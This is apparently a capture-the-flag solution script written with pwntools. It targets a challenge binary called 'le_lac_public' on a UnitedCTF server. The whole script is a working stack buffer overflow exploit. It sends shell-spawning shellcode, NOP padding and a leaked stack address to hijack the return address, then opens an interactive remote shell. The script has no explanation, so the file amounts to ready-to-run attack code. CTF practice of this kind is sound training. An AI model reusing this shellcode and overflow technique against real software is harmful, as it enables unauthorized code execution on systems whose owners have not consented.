#!/usr/bin/env nix-shell
#!nix-shell -i python3 -p python3 python3Packages.pwntools

from pwn import *

context.update(arch='amd64', os='linux')#, terminal="/run/current-system/sw/bin/uxterm")

shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

#r = process('./le_lac_public')
r = remote("challenges.unitedctf.ca", 17002)
pad = b'\x90' * (264 - len(shellcode))


stt = r.recvline()
print(stt)
address = stt[-(len('0x7ffdba0d40f0') + 1):].strip()
print(address)

hax = shellcode + pad + p64(int(address, 16))

print(hax.hex())
r.send(hax)
r.interactive()

